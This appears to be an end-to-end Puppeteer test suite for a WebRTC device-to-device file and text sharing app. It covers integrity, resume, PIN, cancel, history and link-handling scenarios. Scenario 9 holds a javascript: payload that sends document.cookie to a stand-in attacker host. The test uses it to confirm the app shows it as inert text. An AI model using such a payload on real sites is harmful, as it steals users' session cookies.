/**
 * Real two-tab transfers over WebRTC in a real Chrome. Start both servers first
 * (`npm run dev:all`), then: `npm run test:e2e`.
 *
 * These are the tests that matter — they prove the bytes arrive intact, that the
 * route is genuinely device-to-device, and that a transfer killed mid-flight
 * picks up from the byte it stopped at instead of starting over.
 */
import puppeteer from "puppeteer-core";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";

const BASE = process.env.E2E_URL || "http://localhost:3000";
const CHROME =
  process.env.CHROME_PATH ||
  "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";

const WORK = path.join(os.tmpdir(), "qrdrop-e2e");
fs.rmSync(WORK, { recursive: true, force: true });
fs.mkdirSync(WORK, { recursive: true });

let failed = false;
const log = (...a) => console.log(...a);
const check = (name, cond, extra = "") => {
  log(`${cond ? "  ✓" : "  ✗"} ${name}${extra ? " :: " + extra : ""}`);
  if (!cond) failed = true;
};

const sha = (buf) => crypto.createHash("sha256").update(buf).digest("hex");
const skip = (name, why) => console.log(`  ~ ${name} — SKIPPED: ${why}`);

/**
 * Fire a button's handler through the DOM rather than via puppeteer's element
 * click. During an active transfer the element-handle path — scroll-into-view,
 * clickable-point, stability checks — hangs indefinitely on this page, while a
 * plain `.click()` returns in ~10ms and the page stays responsive throughout
 * (measured: 3-19ms per evaluate mid-transfer). The app is not the problem, so
 * don't let the harness pretend it is.
 */
async function domClick(page, selector) {
  const result = await page.evaluate((sel) => {
    const el = document.querySelector(sel);
    if (!el) return `no element matching ${sel}`;
    el.click();
    return "ok";
  }, selector);
  if (result !== "ok") throw new Error(`domClick: ${result}`);
}

/**
 * The drop hook only exists in development builds, so resume scenarios cannot run
 * against a production deployment. Saying so is the point: calling the missing
 * hook is a silent no-op, and a scenario that reports success without having cut
 * anything is worse than one that admits it was skipped.
 */
async function dropHookAvailable(page) {
  return page.evaluate(() => typeof window.__qrdropDropLink === "function");
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function makePayload(name, size) {
  const file = path.join(WORK, name);
  fs.writeFileSync(file, crypto.randomBytes(size));
  return { file, size, hash: sha(fs.readFileSync(file)) };
}

async function waitForDownload(dir, timeoutMs = 90000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const files = fs
      .readdirSync(dir)
      .filter((f) => !f.endsWith(".crdownload") && !f.startsWith("."));
    if (files.length) {
      // Wait for the size to stop changing before reading it.
      const p = path.join(dir, files[0]);
      let last = -1;
      while (Date.now() < deadline) {
        const s = fs.statSync(p).size;
        if (s === last && s > 0) return p;
        last = s;
        await sleep(120);
      }
      return p;
    }
    await sleep(120);
  }
  return null;
}

const browser = await puppeteer.launch({
  executablePath: CHROME,
  headless: true,
  args: ["--no-sandbox"],
});

/** Opens the sender, picks the file, and returns the share URL. */
async function openSender(payloadPaths, tag, opts = {}) {
  const paths = Array.isArray(payloadPaths) ? payloadPaths : [payloadPaths];
  const page = await browser.newPage();
  page.on("pageerror", (e) => log(`  [${tag} sender pageerror]`, e.message));
  page.on("console", (m) => {
    if (m.type() === "error") log(`  [${tag} sender console]`, m.text());
  });
  await page.goto(`${BASE}/send`, { waitUntil: "networkidle2" });
  const input = await page.waitForSelector("input[type=file]");
  if (opts.requirePin) {
    await page.click(".toggle-track");
  }
  await input.uploadFile(...paths);

  // Surface a server-side refusal (e.g. the per-IP rate limit, if the signal
  // suite just ran) instead of letting it look like a mystery timeout.
  await page.waitForSelector(".link-row input, .notice.bad", { timeout: 20000 });
  const refusal = await page.$(".notice.bad");
  if (refusal) {
    throw new Error(
      `sender was refused: ${await refusal.evaluate((el) => el.textContent)}`,
    );
  }
  const url = await page.$eval(".link-row input", (el) => el.value);
  return { page, url };
}

/** Opens the sender in text mode, sends the snippet, and returns the share URL. */
async function openTextSender(text, tag) {
  const page = await browser.newPage();
  page.on("pageerror", (e) => log(`  [${tag} sender pageerror]`, e.message));
  page.on("console", (m) => {
    if (m.type() === "error") log(`  [${tag} sender console]`, m.text());
  });
  await page.goto(`${BASE}/send`, { waitUntil: "networkidle2" });
  await page.click(".switch-mode");
  await page.waitForSelector(".text-input");
  await page.type(".text-input", text);
  await domClick(page, ".text-foot .btn");
  await page.waitForSelector(".link-row input, .notice.bad", { timeout: 20000 });
  const refusal = await page.$(".notice.bad");
  if (refusal) {
    throw new Error(
      `sender was refused: ${await refusal.evaluate((el) => el.textContent)}`,
    );
  }
  return { page, url: await page.$eval(".link-row input", (el) => el.value) };
}

async function openReceiver(url, downloadDir, tag) {
  fs.mkdirSync(downloadDir, { recursive: true });
  const page = await browser.newPage();
  page.on("pageerror", (e) => log(`  [${tag} receiver pageerror]`, e.message));
  page.on("console", (m) => {
    if (m.type() === "error") log(`  [${tag} receiver console]`, m.text());
  });
  const cdp = await page.createCDPSession();
  await cdp.send("Browser.setDownloadBehavior", {
    behavior: "allow",
    downloadPath: downloadDir,
    eventsEnabled: true,
  });
  await page.goto(url, { waitUntil: "networkidle2" });
  return page;
}

try {
  // ============================================ 1. plain transfer, verified
  log("\n▸ scenario 1 — 3 MB transfer, byte-for-byte");
  {
    const payload = makePayload("payload.bin", 3 * 1024 * 1024 + 777);
    const dl = path.join(WORK, "dl1");
    const { page: send, url } = await openSender(payload.file, "s1");
    check("sender produced a share URL", /\/r\/[0-9a-f-]{36}$/.test(url), url);
    check("QR code rendered", !!(await send.$(".qr-frame svg")));

    const recv = await openReceiver(url, dl, "s1");
    await recv.waitForSelector(".file-name", { timeout: 20000 });
    check(
      "receiver sees the file before accepting",
      (await recv.$eval(".file-name", (el) => el.textContent)).includes("payload.bin"),
    );
    // The device labels are the cross-ecosystem story; both ends should show a pair.
    const labels = await recv.$$eval(".dl-label", (els) =>
      els.map((e) => e.textContent.trim()),
    );
    check("receiver shows both devices in the link", labels.length === 2, labels.join(" → "));

    await (await recv.waitForSelector(".btn.primary")).click();
    await recv.waitForFunction(
      () => document.querySelector("a.btn.primary")?.textContent?.includes("Save file"),
      { timeout: 90000 },
    );
    check("receiver reached completion", true);

    await send.waitForFunction(() => document.body.innerText.includes("delivered"), {
      timeout: 30000,
    });
    check("sender got delivery confirmation", true);

    // Proof the file never went through a server: the negotiated ICE pair is not
    // a relay. Which *kind* of direct varies by environment and is not the point
    // — on localhost both ends offer host candidates ("same network"), while on a
    // real HTTPS origin Chrome hides local IPs behind mDNS and the pair resolves
    // reflexively ("peer-to-peer"). Neither puts a server in the data path.
    const pathText = await send.$eval(".pathline", (el) => el.textContent);
    check(
      "connection was direct, with no relay in the data path",
      /Direct/.test(pathText) && !/Relayed/.test(pathText),
      pathText,
    );

    const got = await waitForDownload(dl);
    check("file landed in downloads", !!got, got || "(nothing)");
    if (got) {
      const buf = fs.readFileSync(got);
      check("size matches exactly", buf.length === payload.size, `${buf.length} vs ${payload.size}`);
      check("sha256 matches source", sha(buf) === payload.hash);
    }

    const third = await browser.newPage();
    await third.goto(url, { waitUntil: "networkidle2" });
    await third.waitForSelector(".notice.bad", { timeout: 20000 });
    check(
      "replaying the QR link fails",
      !!(await third.$eval(".notice.bad", (el) => el.textContent)),
    );
    await Promise.all([send.close(), recv.close(), third.close()]);
  }

  // ================================== 2. resume after the link is torn down
  // Repeatable: RESUME_RUNS=5 npm run test:e2e shakes out renegotiation races.
  const runs = Number(process.env.RESUME_RUNS || 1);
  for (let run = 1; run <= runs; run++) {
  log(`\n▸ scenario 2.${run} — 64 MB transfer, link killed mid-flight`);
  {
    const payload = makePayload(`big-${run}.bin`, 64 * 1024 * 1024);
    const dl = path.join(WORK, `dl2-${run}`);
    const { page: send, url } = await openSender(payload.file, "s2");
    const recv = await openReceiver(url, dl, "s2");

    await recv.waitForSelector(".btn.primary", { timeout: 20000 });
    if (!(await dropHookAvailable(recv))) {
      skip(
        `scenario 2.${run}`,
        "no drop hook in this build — resume needs a dev server (npm run dev)",
      );
      await Promise.all([send.close(), recv.close()]);
      continue;
    }
    await (await recv.$(".btn.primary")).click();

    // Kill the peer connection the way a sleeping phone would, partway through.
    let droppedAt = null;
    const deadline = Date.now() + 60000;
    while (Date.now() < deadline) {
      const pct = await recv
        .$eval(".pct", (el) => parseInt(el.textContent, 10))
        .catch(() => null);
      if (pct !== null && pct >= 5) {
        droppedAt = pct;
        await recv.evaluate(() => window.__qrdropDropLink?.());
        break;
      }
      if (await recv.$("a.btn.primary")) break; // finished before we could cut in
      await sleep(25);
    }
    check(
      "cut the link mid-transfer",
      droppedAt !== null,
      droppedAt !== null ? `at ${droppedAt}%` : "transfer finished too fast to interrupt",
    );

    if (droppedAt !== null) {
      // The pause must be visible, not silent.
      const paused = await recv
        .waitForFunction(
          () => document.querySelector(".notice.warn") !== null,
          { timeout: 8000 },
        )
        .then(() => true)
        .catch(() => false);
      check("receiver showed a retrying notice", paused);
    }

    await recv.waitForFunction(
      () => document.querySelector("a.btn.primary")?.textContent?.includes("Save file"),
      { timeout: 120000 },
    );
    check("transfer resumed and completed", true);

    // The sender must also learn it finished — it only hears via the ack on the
    // renegotiated channel, so this is the assertion that catches a half-healed
    // link that quietly delivered the bytes but never closed the loop.
    const senderDone = await send
      .waitForFunction(() => document.body.innerText.includes("delivered"), {
        timeout: 60000,
      })
      .then(() => true)
      .catch(() => false);
    check("sender confirmed delivery after the resume", senderDone);

    const got = await waitForDownload(dl);
    check("resumed file landed in downloads", !!got, got || "(nothing)");
    if (got) {
      const buf = fs.readFileSync(got);
      check(
        "resumed size matches exactly",
        buf.length === payload.size,
        `${buf.length} vs ${payload.size}`,
      );
      // The real assertion: no duplicated or missing chunk around the seam.
      check("resumed sha256 matches source", sha(buf) === payload.hash);
    }
    await Promise.all([send.close(), recv.close()]);
  }
  }
  // ==================================== 3. several files in one session
  log("\n▸ scenario 3 — 4 files in one session, each verified");
  {
    const payloads = [
      makePayload("one.bin", 300 * 1024 + 11),
      makePayload("two.bin", 900 * 1024 + 7),
      makePayload("three.bin", 64 * 1024 + 3),
      makePayload("four.bin", 1200 * 1024 + 5),
    ];
    const dl = path.join(WORK, "dl3");
    const { page: send, url } = await openSender(payloads.map((p) => p.file), "s3");
    const recv = await openReceiver(url, dl, "s3");

    await recv.waitForSelector(".filelist li", { timeout: 20000 });
    const listed = await recv.$$eval(".filelist-name", (els) =>
      els.map((e) => e.textContent),
    );
    check(
      "the receiver lists every file before accepting",
      listed.length === 4 && listed.includes("three.bin"),
      listed.join(", "),
    );
    const headline = await recv.$eval(".file-size", (el) => el.textContent);
    check("it shows the batch total, not one file", /2\.4 MB|2\.3 MB/.test(headline), headline);

    await (await recv.$(".btn.primary")).click();
    await recv.waitForFunction(
      () => document.querySelectorAll('.filelist li[data-state="done"]').length === 4,
      { timeout: 120000 },
    );
    check("all four files complete", true);

    await send.waitForFunction(() => document.body.innerText.includes("delivered"), {
      timeout: 30000,
    });

    // Chrome may block the 2nd+ automatic download, so click the Save links the
    // UI keeps for exactly that reason.
    const links = await recv.$$(".filelist-save");
    for (const link of links) await link.click().catch(() => {});
    await sleep(1200);

    const arrived = fs.readdirSync(dl).filter((f) => !f.endsWith(".crdownload"));
    check(
      "every file lands on disk",
      payloads.every((p) => arrived.includes(path.basename(p.file))),
      arrived.join(", "),
    );
    let allMatch = true;
    for (const p of payloads) {
      const name = path.basename(p.file);
      const got = path.join(dl, name);
      if (!fs.existsSync(got)) {
        allMatch = false;
        continue;
      }
      const buf = fs.readFileSync(got);
      if (buf.length !== p.size || sha(buf) !== p.hash) {
        allMatch = false;
        log(`      ${name}: ${buf.length} vs ${p.size}, hash ${sha(buf) === p.hash}`);
      }
    }
    check("each file matches its source by sha256", allMatch);
    await Promise.all([send.close(), recv.close()]);
  }

  // ============== 4. a drop mid-batch must not lose or repeat a file
  log("\n▸ scenario 4 — link cut mid-batch, resume across the file boundary");
  {
    const payloads = [
      makePayload("a.bin", 8 * 1024 * 1024),
      makePayload("b.bin", 24 * 1024 * 1024 + 13),
      makePayload("c.bin", 8 * 1024 * 1024 + 1),
    ];
    const dl = path.join(WORK, "dl4");
    const { page: send, url } = await openSender(payloads.map((p) => p.file), "s4");
    const recv = await openReceiver(url, dl, "s4");
    await recv.waitForSelector(".btn.primary", { timeout: 20000 });
    if (!(await dropHookAvailable(recv))) {
      skip(
        "scenario 4",
        "no drop hook in this build — resume needs a dev server (npm run dev)",
      );
      await Promise.all([send.close(), recv.close()]);
    } else {
    await (await recv.$(".btn.primary")).click();

    // Wait until we are into the *second* file, so the resume has to rewind to a
    // partially received file with earlier ones already banked.
    let cutAt = null;
    const deadline = Date.now() + 60000;
    while (Date.now() < deadline) {
      const state = await recv.evaluate(() => ({
        done: document.querySelectorAll('.filelist li[data-state="done"]').length,
        pct: parseInt(document.querySelector(".pct")?.textContent ?? "0", 10),
      }));
      if (state.done >= 1 && state.pct > 30) {
        cutAt = state;
        await recv.evaluate(() => window.__qrdropDropLink?.());
        break;
      }
      if (await recv.$("a.btn.primary")) break;
      await sleep(25);
    }
    check(
      "cut the link after the first file was banked",
      cutAt !== null,
      cutAt ? `${cutAt.done} done, ${cutAt.pct}% overall` : "finished too fast",
    );

    await recv.waitForFunction(
      () => document.querySelectorAll('.filelist li[data-state="done"]').length === 3,
      { timeout: 180000 },
    );
    check("the batch resumes and finishes", true);

    for (const link of await recv.$$(".filelist-save")) {
      await link.click().catch(() => {});
    }
    await sleep(1500);

    let ok = true;
    for (const p of payloads) {
      const got = path.join(dl, path.basename(p.file));
      if (!fs.existsSync(got)) {
        ok = false;
        log(`      missing ${path.basename(p.file)}`);
        continue;
      }
      const buf = fs.readFileSync(got);
      if (buf.length !== p.size || sha(buf) !== p.hash) {
        ok = false;
        log(`      ${path.basename(p.file)} corrupt: ${buf.length} vs ${p.size}`);
      }
    }
    // If the seam duplicated or dropped a chunk, this is where it shows.
    check("every file still matches by sha256 after the resume", ok);
    await Promise.all([send.close(), recv.close()]);
    }
  }
  // ================================= 5. the PIN gate, through the real UI
  log("\n▸ scenario 5 — PIN-protected transfer");
  {
    const payload = makePayload("payslip.pdf", 700 * 1024 + 3);
    const dl = path.join(WORK, "dl5");
    const { page: send, url } = await openSender(payload.file, "s5", {
      requirePin: true,
    });

    const pin = await send
      .$eval(".pinbox-digits", (el) => el.textContent.replace(/\D/g, ""))
      .catch(() => null);
    check("the sender is shown a 6-digit PIN", /^\d{6}$/.test(pin || ""), pin || "(none)");

    const recv = await openReceiver(url, dl, "s5");
    await recv.waitForSelector(".pin-input", { timeout: 20000 });
    check("the receiver is asked for the PIN first", true);

    // Nothing about the transfer may be on screen yet.
    const bodyBeforePin = await recv.evaluate(() => document.body.innerText);
    check(
      "the filename is not revealed before the PIN",
      !bodyBeforePin.includes("payslip"),
      bodyBeforePin.replace(/\n+/g, " | ").slice(0, 80),
    );
    check(
      "no Accept button is reachable before the PIN",
      !(await recv.$(".btn.primary:not([disabled])")) ||
        !(await recv.$eval(".btn.primary", (el) => el.textContent)).includes("Accept"),
    );

    // A wrong PIN must be refused, and reported to the sender.
    await recv.type(".pin-input", "000000");
    await recv.click(".btn.primary");
    await recv.waitForSelector(".notice.bad", { timeout: 15000 });
    const wrongMsg = await recv.$eval(".notice.bad", (el) => el.textContent);
    check("a wrong PIN is refused with attempts left", /Wrong PIN/i.test(wrongMsg), wrongMsg.trim());

    await send.waitForFunction(
      () => document.body.innerText.includes("wrong PIN"),
      { timeout: 15000 },
    );
    check("the sender is warned about the wrong guess", true);

    // Now the real one.
    await recv.$eval(".pin-input", (el) => (el.value = ""));
    await recv.type(".pin-input", pin);
    await recv.click(".btn.primary");
    await recv.waitForFunction(
      () => document.body.innerText.includes("payslip.pdf"),
      { timeout: 20000 },
    );
    check("the right PIN reveals the transfer", true);

    await (await recv.waitForSelector(".btn.primary", { timeout: 10000 })).click();
    await recv.waitForFunction(
      () => document.querySelector("a.btn.primary")?.textContent?.includes("Save file"),
      { timeout: 90000 },
    );
    const got = await waitForDownload(dl);
    check("the PIN-gated file arrives", !!got, got || "(nothing)");
    if (got) {
      const buf = fs.readFileSync(got);
      check("and matches its source by sha256", sha(buf) === payload.hash);
    }
    await Promise.all([send.close(), recv.close()]);
  }
  // ============================== 6. cancelling, from either side
  log("\n▸ scenario 6 — cancelling mid-transfer, both directions");
  {
    // Sender cancels: the receiver must be told it was deliberate, not left
    // waiting out the resume window for a peer that is never coming back.
    const payload = makePayload("cancel-me.bin", 40 * 1024 * 1024);
    const { page: send, url } = await openSender(payload.file, "s6a");
    const recv = await openReceiver(url, path.join(WORK, "dl6a"), "s6a");
    await (await recv.waitForSelector(".btn.primary", { timeout: 20000 })).click();
    await recv.waitForFunction(() => {
      const el = document.querySelector(".pct");
      return el && parseInt(el.textContent, 10) > 3;
    }, { timeout: 60000 });

    await domClick(send, ".back");
    const sawCancel = await recv
      .waitForFunction(
        () => document.body.innerText.includes("sender cancelled"),
        { timeout: 15000 },
      )
      .then(() => true)
      .catch(() => false);
    check("the receiver is told the sender cancelled", sawCancel);
    const text = await recv.evaluate(() => document.body.innerText);
    check(
      "and is NOT told to wait for a sleeping phone",
      !/went to sleep|Waiting for it/.test(text),
      "that message would mean a 2-minute wait for nothing",
    );
    await Promise.all([send.close(), recv.close()]);
  }
  {
    // Receiver cancels: the sender must hear about it.
    const payload = makePayload("cancel-me-2.bin", 40 * 1024 * 1024);
    const { page: send, url } = await openSender(payload.file, "s6b");
    const recv = await openReceiver(url, path.join(WORK, "dl6b"), "s6b");
    await (await recv.waitForSelector(".btn.primary", { timeout: 20000 })).click();
    await recv.waitForFunction(() => {
      const el = document.querySelector(".pct");
      return el && parseInt(el.textContent, 10) > 3;
    }, { timeout: 60000 });

    check("the receiver has a way to stop it", !!(await recv.$(".back")), "was missing entirely before");
    await domClick(recv, ".back");
    const stopped = await recv
      .waitForFunction(() => document.body.innerText.includes("Transfer stopped"), { timeout: 15000 })
      .then(() => true).catch(() => false);
    check("the receiver confirms it stopped", stopped);
    const senderTold = await send
      .waitForFunction(() => document.body.innerText.includes("receiver cancelled"), { timeout: 15000 })
      .then(() => true).catch(() => false);
    check("the sender is told the receiver cancelled", senderTold);
    await Promise.all([send.close(), recv.close()]);
  }
  // ===================== 7. a completed transfer reaches local history
  // The seeded history suite covers the storage; this covers the wiring — that a
  // real completion on each side actually writes a record, with the right
  // direction and size.
  //
  // Note both peers are pages in ONE browser, so they share a single origin's
  // storage: a completed transfer therefore leaves *two* records here, one from
  // each side. On real devices they would be separate stores. The earlier
  // scenarios have also been filling that store, so it is cleared first.
  log("\n▸ scenario 7 — a completed transfer appears in history");
  {
    const payload = makePayload("history-check.bin", 900 * 1024 + 7);
    const dl = path.join(WORK, "dl7");
    const { page: send, url } = await openSender(payload.file, "s7");
    await send.evaluate(() => localStorage.removeItem("qrdrop.history.v1"));
    const recv = await openReceiver(url, dl, "s7");
    await (await recv.waitForSelector(".btn.primary", { timeout: 20000 })).click();
    await recv.waitForFunction(
      () => document.querySelector("a.btn.primary")?.textContent?.includes("Save file"),
      { timeout: 90000 },
    );
    await send.waitForFunction(() => document.body.innerText.includes("delivered"), {
      timeout: 30000,
    });
    await sleep(600);

    const readStored = (page) =>
      page.evaluate(() => {
        try {
          return JSON.parse(localStorage.getItem("qrdrop.history.v1") || "[]");
        } catch {
          return "unparseable";
        }
      });

    const sent = await readStored(send);
    const received = await readStored(recv);

    check(
      "both sides recorded the transfer",
      Array.isArray(sent) && sent.length === 2,
      Array.isArray(sent) ? `${sent.length} entries (shared store)` : String(sent),
    );
    const asSent = sent.find((e) => e.direction === "sent");
    const asReceived = received.find((e) => e.direction === "received");
    check(
      "the sending side recorded it as sent, with the right name and size",
      asSent?.firstName === "history-check.bin" && asSent?.totalSize === payload.size,
      JSON.stringify(asSent ?? null),
    );
    check(
      "the receiving side recorded it as received",
      asReceived?.totalSize === payload.size && asReceived?.fileCount === 1,
      JSON.stringify(asReceived ?? null),
    );
    check(
      "no session id was stored — it is a bearer token",
      !JSON.stringify(sent).includes(url.split("/r/")[1].split("?")[0]),
      "storing it would leak a live transfer link",
    );

    // And it shows up on the home page, which is the point of recording it.
    await send.goto(`${BASE}/`, { waitUntil: "networkidle2" });
    const shown = await send.evaluate(() => ({
      rows: document.querySelectorAll(".recent-list li").length,
      name: document.querySelector(".recent-name")?.textContent?.trim() ?? "",
    }));
    check(
      "and is listed on the home page",
      shown.rows === 2 && shown.name.includes("history-check.bin"),
      `${shown.rows} rows, ${JSON.stringify(shown.name)}`,
    );
    await Promise.all([send.close(), recv.close()]);
  }
  // ===================== 8. a link sent as text is shown, not downloaded
  // The behaviour worth protecting is the *absence* of a download: every other
  // payload is auto-saved on arrival, and a snippet must not be.
  log("\n▸ scenario 8 — a link sent as text");
  {
    const LINK = "https://example.com/a/path?q=1&r=2";
    const dl = path.join(WORK, "dl8");
    const { page: send, url } = await openTextSender(LINK, "s8");
    const recv = await openReceiver(url, dl, "s8");

    await recv.waitForSelector(".file-name", { timeout: 20000 });
    check(
      "it is offered as a small text file",
      (await recv.$eval(".file-name", (el) => el.textContent)).includes("link.txt"),
      await recv.$eval(".file-name", (el) => el.textContent),
    );

    await (await recv.waitForSelector(".btn.primary")).click();
    await recv.waitForSelector(".text-received", { timeout: 60000 });

    const shown = await recv.evaluate(() => ({
      label: document.querySelector(".file-name")?.textContent ?? "",
      text: document.querySelector(".text-received")?.textContent ?? "",
      href: document.querySelector(".text-actions a")?.getAttribute("href") ?? null,
      rel: document.querySelector(".text-actions a")?.getAttribute("rel") ?? "",
      buttons: [...document.querySelectorAll(".text-actions button")].map((b) =>
        b.textContent.trim(),
      ),
      brightSave: !!document.querySelector("a.btn.primary.wide"),
    }));
    check("the text arrives exactly as typed", shown.text === LINK, JSON.stringify(shown.text));
    check("and is labelled as a link", shown.label === "Link received", shown.label);
    check("with an Open button pointing at it", shown.href === LINK, String(shown.href));
    check(
      "opened with noopener and noreferrer",
      shown.rel.includes("noopener") && shown.rel.includes("noreferrer"),
      shown.rel,
    );
    check("and a Copy button", shown.buttons.includes("Copy"), shown.buttons.join(", "));
    check(
      "the file save is not the bright button — Open is",
      !shown.brightSave,
      "otherwise two primary buttons compete",
    );

    // Copy needs a real input event and a focused tab: a scripted click confers
    // no user activation, and Chrome refuses the write without one.
    await recv.bringToFront();
    await recv.click(".text-actions button");
    let copyOk = true;
    try {
      await recv.waitForFunction(
        () => document.querySelector(".text-actions button")?.textContent?.trim() === "Copied",
        { timeout: 5000 },
      );
    } catch {
      copyOk = false;
    }
    check(
      "Copy reports success",
      copyOk,
      copyOk
        ? ""
        : `button says "${await recv.$eval(".text-actions button", (e) => e.textContent.trim())}"`,
    );

    const stray = await waitForDownload(dl, 4000);
    check(
      "nothing was written to Downloads",
      stray === null,
      stray ? `found ${path.basename(stray)}` : "no stray note.txt",
    );

    await send.waitForFunction(() => document.body.innerText.includes("delivered"), {
      timeout: 30000,
    });
    check("the sender sees it delivered", true);
    await Promise.all([send.close(), recv.close()]);
  }

  // ===================== 9. a hostile "link" gets no button
  // Text arrives from another device. A javascript: URL clicked here would run
  // in this page's origin, so the Open button must simply not appear.
  log("\n▸ scenario 9 — text that only looks like a link");
  {
    const HOSTILE = "javascript:fetch('https://evil.example/'+document.cookie)";
    const dl = path.join(WORK, "dl9");
    const { page: send, url } = await openTextSender(HOSTILE, "s9");
    const recv = await openReceiver(url, dl, "s9");
    await (await recv.waitForSelector(".btn.primary", { timeout: 20000 })).click();
    await recv.waitForSelector(".text-received", { timeout: 60000 });

    const shown = await recv.evaluate(() => ({
      label: document.querySelector(".file-name")?.textContent ?? "",
      text: document.querySelector(".text-received")?.textContent ?? "",
      anchors: document.querySelectorAll(".textout a").length,
      html: document.querySelector(".text-received")?.innerHTML ?? "",
    }));
    check("it still arrives intact, as text", shown.text === HOSTILE, JSON.stringify(shown.text));
    check("labelled as text, not a link", shown.label === "Text received", shown.label);
    check("and offers nothing to click", shown.anchors === 0, `${shown.anchors} links`);
    check(
      "rendered as text, not as markup",
      !shown.html.includes("<script") && !/<a\b/i.test(shown.html),
      shown.html.slice(0, 60),
    );
    await Promise.all([send.close(), recv.close()]);
  }
} catch (e) {
  failed = true;
  log("  ✗ threw:", e.message);
} finally {
  await browser.close();
}

log(failed ? "\nE2E FAILED" : "\nE2E PASSED");
process.exit(failed ? 1 : 0);
